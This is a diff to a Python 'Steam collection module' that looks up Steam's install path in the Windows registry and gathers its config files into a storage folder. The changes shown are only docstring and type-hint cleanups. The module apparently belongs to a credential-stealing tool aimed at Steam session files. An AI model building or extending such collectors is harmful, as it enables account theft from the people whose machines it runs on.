@@ -1,6 +1,7 @@
 from re import findall
 from shutil import copy
 from os import listdir, makedirs, path
+from typing import Optional
 from winreg import OpenKey, QueryValueEx, HKEY_LOCAL_MACHINE, KEY_READ, KEY_WOW64_32KEY
 
 
@@ -15,16 +16,26 @@ class Steam:
     def __create_folder(self) -> None:
         """
         Creates storage for the Steam module.
-        :return: None
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
         """
         if not path.exists(self.__full_path):
             makedirs(self.__full_path)
 
     @staticmethod
-    def __get_steam_path() -> str:
+    def __get_steam_path() -> Optional[str]:
         """
         Gets the Steam installation path from the registry.
-        :return: str
+
+        Parameters:
+        - None.
+
+        Returns:
+        - str|None: Steam installation path if found.
         """
         try:
             key = OpenKey(HKEY_LOCAL_MACHINE, r"SOFTWARE\Valve\Steam")
@@ -33,16 +44,24 @@ class Steam:
 
         value, _ = QueryValueEx(key, "InstallPath")
 
-        return value
+        if path.exists(value):
+            return value
+
+        return None
 
     def __get_steam_files(self) -> None:
         """
         Collects configs from the Steam.
-        :return: None
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
         """
         steam_path = self.__get_steam_path()
 
-        if not steam_path or not path.exists(steam_path):
+        if not steam_path:
             print(f"[Steam]: No steam found")
             return
 
@@ -59,7 +78,12 @@ class Steam:
     def run(self) -> None:
         """
         Launches the Steam collection module.
-        :return: None
+
+        Parameters:
+        - None.
+
+        Returns:
+        - None.
         """
         try:
 
